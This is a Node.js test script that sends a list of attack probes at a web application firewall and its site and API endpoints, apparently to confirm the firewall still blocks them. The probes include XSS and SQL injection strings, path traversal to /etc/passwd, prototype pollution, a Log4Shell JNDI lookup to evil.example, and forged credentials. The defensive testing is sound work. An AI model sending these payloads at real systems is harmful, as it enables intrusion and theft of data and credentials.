// Requests the WAF must KEEP blocking with the Sitewright exclusions loaded: scanners, exploit
// payloads on public endpoints, and payloads on the authoring API from anyone without a well-formed
// credential. One row per probe: the status the WAF answered (403 = blocked at the WAF).
// usage: node attack-probes.mjs <waf base> <sites domain> <slug> <projectId>
const [WAF, SITES, SLUG, PROJECT] = process.argv.slice(2);
const SITE = `http://${SLUG}.${SITES}:${new URL(WAF).port}`;
const json = (b, h = {}) => ({ method: 'POST', headers: { 'content-type': 'application/json', ...h }, body: JSON.stringify(b) });
const xss = '<script>alert(document.cookie)</script><img src=x onerror=alert(1)>';
const sqli = "1' UNION SELECT username, password FROM users--";
const probes = [
  ['scanner: /.env', `${WAF}/.env`],
  ['scanner: /.git/config', `${WAF}/.git/config`],
  ['scanner: prototype pollution on /', `${WAF}/`, json({ __proto__: { isAdmin: true }, constructor: { prototype: { polluted: 1 } } })],
  ['scanner: Log4Shell in User-Agent', `${WAF}/`, { headers: { 'user-agent': '${jndi:ldap://evil.example/a}' } }],
  ['site page: XSS in the query', `${SITE}/?q=${encodeURIComponent(xss)}`],
  ['site page: path traversal in the query', `${SITE}/?file=../../../../etc/passwd`],
  ['media: path traversal', `${WAF}/media/${SLUG}/..%2f..%2f..%2fetc%2fpasswd`],
  ['form post: SQL injection', `${WAF}/f/${PROJECT}/contact`, json({ name: sqli, email: 'a@example.com', message: 'hi' })],
  ['form post: XSS', `${WAF}/f/${PROJECT}/contact`, json({ name: 'x', email: 'a@example.com', message: xss })],
  ['checkout: SQL injection', `${WAF}/pay/${PROJECT}/shop`, json({ items: [{ sku: sqli, qty: 1 }], fields: {} })],
  ['login: SQL injection in the email', `${WAF}/auth/login`, json({ email: "admin'--", password: "' OR '1'='1" })],
  ['oauth register: XSS in the client name', `${WAF}/oauth/register`, json({ client_name: xss, redirect_uris: ['https://evil.example/cb'] })],
  ['API, no credential: XSS page write', `${WAF}/projects/${PROJECT}/content/page/home`, { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'home', source: xss }) }],
  ['API, no credential: SQLi in the query', `${WAF}/projects?search=${encodeURIComponent(sqli)}`],
  ['API, malformed cookie: XSS page write', `${WAF}/projects/${PROJECT}/content/page/home`, { method: 'PUT', headers: { 'content-type': 'application/json', cookie: 'sw_session=forged' }, body: JSON.stringify({ id: 'home', source: xss }) }],
  ['API, malformed bearer: XSS page write', `${WAF}/projects/${PROJECT}/content/page/home`, { method: 'PUT', headers: { 'content-type': 'application/json', authorization: 'Bearer swk_forged' }, body: JSON.stringify({ id: 'home', source: xss }) }],
  ['API, credential: SQLi in the QUERY (still inspected)', `${WAF}/projects?search=${encodeURIComponent(sqli)}`, { headers: { authorization: `Bearer swk_${'0'.repeat(64)}` } }],
  ['API, credential: SQLi in the query of a WRITE (not inspected, by design → 401)', `${WAF}/projects/${PROJECT}/content/page/home?search=${encodeURIComponent(sqli)}`, { method: 'PUT', headers: { 'content-type': 'application/json', authorization: `Bearer swk_${'0'.repeat(64)}` }, body: '{}' }],
  ['API, well-formed fake credential + scanner user agent on a WRITE (early blocking)', `${WAF}/projects/${PROJECT}/content/page/home`, { method: 'PUT', headers: { 'content-type': 'application/json', authorization: `Bearer swk_${'0'.repeat(64)}`, 'user-agent': 'sqlmap/1.8.2#stable (https://sqlmap.org)' }, body: '{}' }],
  ['API, well-formed fake credential + restricted header on a WRITE (early blocking)', `${WAF}/projects/${PROJECT}/content/page/home`, { method: 'PUT', headers: { 'content-type': 'application/json', authorization: `Bearer swk_${'0'.repeat(64)}`, 'content-range': 'bytes 0-1/2' }, body: '{}' }],
  ['MCP, no token: XSS tool call', `${WAF}/mcp`, json({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'put_page', arguments: { page: { id: 'x', source: xss } } } })],
  ['MCP, WELL-FORMED but invalid token: XSS tool call (passes the WAF by design → 401)', `${WAF}/mcp`, json({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'put_page', arguments: { page: { id: 'x', source: xss } } } }, { authorization: `Bearer swk_${'0'.repeat(64)}` })],
];
for (const [label, url, init] of probes) {
  let status;
  try {
    status = (await fetch(url, { redirect: 'manual', ...(init ?? {}) })).status;
  } catch (e) {
    status = `ERR ${e.message}`;
  }
  console.log(`${String(status).padEnd(4)} ${label}`);
}
